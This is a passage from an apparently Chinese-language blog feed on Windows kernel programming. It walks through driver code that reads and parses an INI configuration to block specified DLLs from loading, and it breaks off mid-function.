class="line"><span class="function"><span class="type">void</span> <span class="title">UninitializeLookAsideList</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (__IsLookAsideList == TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExDeleteNPagedLookasideList</span>(&amp;__LookAsideList);</span><br><span class="line">        __IsLookAsideList = FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows Kernel </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内核解析拦截DLL设置</title>
      <link href="/2024/03/09/%E5%86%85%E6%A0%B8%E8%A7%A3%E6%9E%90%E6%8B%A6%E6%88%AADLL%E8%AE%BE%E7%BD%AE/"/>
      <url>/2024/03/09/%E5%86%85%E6%A0%B8%E8%A7%A3%E6%9E%90%E6%8B%A6%E6%88%AADLL%E8%AE%BE%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="内核拦截DLL"><a href="#内核拦截DLL" class="headerlink" title="内核拦截DLL"></a>内核拦截DLL</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">FAST_MUTEX __AntiLoadDllLock;</span><br><span class="line">PANTI_LOAD_DLL __AntiLoadDll = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">InitializeAntiLoadDll</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">ExInitializeFastMutex</span>(&amp;__AntiLoadDllLock);</span><br><span class="line">    <span class="built_in">BootReadFile</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="处理文件信息"><a href="#处理文件信息" class="headerlink" title="处理文件信息"></a>处理文件信息</h2><p>首先获取当前工作目录，然后将其与文件名 XXXX.ini 拼接起来，得到文件的路径。接着，使用 Windows API 函数 ZwCreateFile 打开文件，使用 ZwQueryInformationFile 获取文件长度，使用 ExAllocatePool 分配内存缓冲区，再使用 ZwReadFile 读取文件内容。最后，它调用 ParseAntiLoadFile 解析文件内容</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOLEAN</span></span><br><span class="line"><span class="function"><span class="title">BootReadFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    UNICODE_STRING v1 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HANDLE FileHandle = <span class="literal">NULL</span>;</span><br><span class="line">    OBJECT_ATTRIBUTES ObjectAttributes = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    IO_STATUS_BLOCK IoStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    FILE_STANDARD_INFORMATION FileStandardInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    LARGE_INTEGER FileLength = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    LARGE_INTEGER ByteOffset = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PVOID VirtualAddress = <span class="literal">NULL</span>;</span><br><span class="line">    WCHAR* v5 = <span class="literal">NULL</span>;</span><br><span class="line">    BOOLEAN IsOk = FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!__WorkPath.Length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 驱动路径</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v5 = (PWCHAR)<span class="built_in">AllocateBuffer</span>(MAX_BYTE);</span><br><span class="line">    <span class="keyword">if</span> (v5 == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 拼接出ini路径</span></span><br><span class="line">    Status = <span class="built_in">AppendWorkPath</span>(</span><br><span class="line">        v5,</span><br><span class="line">        MAX_PATH,</span><br><span class="line">        FILE_NAME,</span><br><span class="line">        <span class="built_in">WCHAR_COUNT_BY_ARRAY</span>(FILE_NAME)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (Status != STATUS_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 最终v5形如&quot;\??\C:\911kisknl64\XXXX.ini&quot;</span></span><br><span class="line">    <span class="comment">//双字转换为Unicode</span></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(</span><br><span class="line">        &amp;v1,</span><br><span class="line">        v5);</span><br><span class="line"><span class="comment">// 初始化OA</span></span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(</span><br><span class="line">        &amp;ObjectAttributes,</span><br><span class="line">        &amp;v1,</span><br><span class="line">        OBJ_CASE_INSENSITIVE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打开文件</span></span><br><span class="line">    Status = <span class="built_in">ZwCreateFile</span>(</span><br><span class="line">        &amp;FileHandle,</span><br><span class="line">        GENERIC_READ | SYNCHRONIZE | FILE_READ_ATTRIBUTES,</span><br><span class="line">        &amp;ObjectAttributes,</span><br><span class="line">        &amp;IoStatusBlock,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,</span><br><span class="line">        FILE_OPEN,</span><br><span class="line">        FILE_RANDOM_ACCESS | FILE_COMPLETE_IF_OPLOCKED | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//计算文件长度</span></span><br><span class="line">    Status = <span class="built_in">ZwQueryInformationFile</span>(</span><br><span class="line">        FileHandle,</span><br><span class="line">        &amp;IoStatusBlock,</span><br><span class="line">        &amp;FileStandardInfo,</span><br><span class="line">        <span class="built_in">sizeof</span>(FILE_STANDARD_INFORMATION),</span><br><span class="line">        FileStandardInformation</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FileLength = FileStandardInfo.EndOfFile;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FileLength.QuadPart &gt; <span class="number">50</span> * <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 申请一个非分页内存</span></span><br><span class="line">    VirtualAddress = <span class="built_in">ExAllocatePool</span>(</span><br><span class="line">        NonPagedPool,</span><br><span class="line">        (ULONG)FileLength.LowPart + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == VirtualAddress)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(VirtualAddress, (ULONG)FileLength.LowPart + <span class="number">1</span>);</span><br><span class="line">    Status = <span class="built_in">ZwReadFile</span>(</span><br><span class="line">        FileHandle,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;IoStatusBlock,</span><br><span class="line">        VirtualAddress,</span><br><span class="line">        (ULONG)FileLength.LowPart,</span><br><span class="line">        &amp;ByteOffset,   <span class="comment">//真正读取了多少</span></span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 读出文件内容，转交ParseAntiLoadFile函数处理</span></span><br><span class="line">    IsOk = <span class="built_in">ParseAntiLoadFile</span>((LPSTR)VirtualAddress);</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">FreeBuffer</span>(v5);</span><br><span class="line">    v5 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (VirtualAddress != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExFreePool</span>(VirtualAddress);</span><br><span class="line">        VirtualAddress = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != FileHandle)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ZwClose</span>(FileHandle);</span><br><span class="line">        FileHandle = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> IsOk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="拼接文件路径"><a href="#拼接文件路径" class="headerlink" title="拼接文件路径"></a>拼接文件路径</h2><p>将GLOBAL_LINK、__WorkPath.Buffer和Name三者拼接成一个完整的路径，存储在Path变量中，并返回操作的执行状态</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">AppendWorkPath</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    WCHAR* Path,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG  PathLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    WCHAR* Name,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG  NameLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExAcquireFastMutex</span>(&amp;__WorkPathLock);</span><br><span class="line">    <span class="keyword">if</span> (__WorkPath.Buffer == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExReleaseFastMutex</span>(&amp;__WorkPathLock);</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 将GLOBAL_LINK复制到Path中</span></span><br><span class="line">        Status = <span class="built_in">RtlStringCchCopyW</span>(Path, PathLength, GLOBAL_LINK);</span><br><span class="line">        Path += <span class="built_in">WCHAR_COUNT_BY_ARRAY</span>(GLOBAL_LINK);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">// 限制大小 将__WorkPath.Buffer拷贝到Path中</span></span><br><span class="line">        Status = <span class="built_in">RtlStringCchCopyNW</span>(Path, PathLength, __WorkPath.Buffer, __WorkPath.Length / <span class="built_in">sizeof</span>(WCHAR));</span><br><span class="line">        <span class="comment">// 更新path指针位置</span></span><br><span class="line">        Path += __WorkPath.Length / <span class="built_in">sizeof</span>(WCHAR);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">       </span><br><span class="line">        <span class="comment">// 检查__WorkPath.Buffer末尾是否是&#x27;\\&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> (__WorkPath.Buffer[__WorkPath.Length / <span class="built_in">sizeof</span>(WCHAR) - <span class="number">1</span>] != <span class="string">L&#x27;\\&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 没有，加上</span></span><br><span class="line">            Status = <span class="built_in">RtlStringCchCopyNW</span>(Path, PathLength, <span class="string">L&quot;\\&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            Path++;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 将name变量内容也拷贝到Path中</span></span><br><span class="line">        Status = <span class="built_in">RtlStringCchCopyNW</span>(Path, PathLength, Name, NameLength);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        Status = STATUS_SUCCESS;</span><br><span class="line">    &#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExReleaseFastMutex</span>(&amp;__WorkPathLock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="xxxx-ini"><a href="#xxxx-ini" class="headerlink" title="xxxx.ini"></a>xxxx.ini</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[AntiLoadDll]</span><br><span class="line">Count=2;1=1111;2=2222;</span><br></pre></td></tr></table></figure><h2 id="解析对抗DLL加载"><a href="#解析对抗DLL加载" class="headerlink" title="解析对抗DLL加载"></a>解析对抗DLL加载</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_NAME           <span class="string">L&quot;XXXX.ini&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_NAME            <span class="string">&quot;[AntiLoadDll]&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUB_KEY_COUNT_NAME      <span class="string">&quot;Count=&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEPARATE_NAME       <span class="string">&quot;;&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_ANTI_LOAD_DLL_ENTRY</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONG PathHash;</span><br><span class="line">&#125;ANTI_LOAD_DLL_ENTRY, *PANTI_LOAD_DLL_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_ANTI_LOAD_DLL_</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> Count;</span><br><span class="line">    ANTI_LOAD_DLL_ENTRY Entry[<span class="number">1</span>];</span><br><span class="line">&#125;ANTI_LOAD_DLL, * PANTI_LOAD_DLL;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN</span></span><br><span class="line"><span class="function"><span class="title">ParseAntiLoadFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in PSTR VirtualAddress</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOLEAN IsOk = FALSE;</span><br><span class="line">    PSTR v1 = <span class="literal">NULL</span>;</span><br><span class="line">    PSTR v2 = <span class="literal">NULL</span>;</span><br><span class="line">    CHAR Key[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    CHAR KeyValue[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    INT Count = <span class="number">0</span>;</span><br><span class="line">    ULONG ViewSize = <span class="number">0</span>;</span><br><span class="line">    INT i = <span class="number">0</span>;</span><br><span class="line">    ULONG PathHash = <span class="number">0</span>;   <span class="comment">// 字符串的Hash值表达   </span></span><br><span class="line">    ANSI_STRING v3;</span><br><span class="line">    UNICODE_STRING v4;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (VirtualAddress == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> IsOk;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ExAcquireFastMutex</span>(&amp;__AntiLoadDllLock);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 从VirtualAddress查找第一次出现KEY_NAME的位置，返回到v1</span></span><br><span class="line">        <span class="comment">// 检查文件头</span></span><br><span class="line">        v1 = <span class="built_in">strstr</span>(VirtualAddress, KEY_NAME);</span><br><span class="line">        <span class="keyword">if</span> (v1 == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 找到文件开始位置</span></span><br><span class="line">        v1 = <span class="built_in">strstr</span>(v1, SUB_KEY_COUNT_NAME);</span><br><span class="line">        <span class="keyword">if</span> (v1 == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 移动指针到内容</span></span><br><span class="line">        v1 += <span class="built_in">strlen</span>(SUB_KEY_COUNT_NAME);</span><br><span class="line">        <span class="keyword">if</span> (v1 == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 指针v2指向第一个分号</span></span><br><span class="line">        v2 = <span class="built_in">strstr</span>(v1, SEPARATE_NAME);  </span><br><span class="line">        <span class="keyword">if</span> (v2 == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>(Key, <span class="built_in">sizeof</span>(Key));</span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>(KeyValue, <span class="built_in">sizeof</span>(KeyValue));</span><br><span class="line">        <span class="comment">// 按照规则创建一个格式化的字符串 %d</span></span><br><span class="line">        Status = <span class="built_in">RtlStringCchPrintfA</span>(</span><br><span class="line">            Key,</span><br><span class="line">            <span class="number">32</span>,</span><br><span class="line">            <span class="string">&quot;%d&quot;</span>,</span><br><span class="line">            DLL_MAX_COUNT</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Count = 100,120</span></span><br><span class="line">        <span class="keyword">if</span> ((v2 &lt;= v1) ||</span><br><span class="line">            (v2 - v1 &gt; (<span class="type">int</span>)<span class="built_in">strlen</span>(Key)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 指针位置不对</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将v1、v2之间的内容拷贝到KeyValue中，转换成UnicodeString</span></span><br><span class="line">        <span class="built_in">RtlCopyMemory</span>(KeyValue, v1, v2 - v1);</span><br><span class="line">        <span class="built_in">RtlInitAnsiString</span>(&amp;v3, KeyValue);</span><br><span class="line">        Status = <span class="built_in">RtlAnsiStringToUnicodeString</span>(</span><br><span class="line">            &amp;v4,</span><br><span class="line">            &amp;v3,</span><br><span class="line">            TRUE     <span class="comment">//动态申请内存</span></span><br><span class="line">        );  <span class="comment">//单字转换成双字</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//转换成Int</span></span><br><span class="line">        Status = <span class="built_in">RtlUnicodeStringToInteger</span>(</span><br><span class="line">            &amp;v4,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            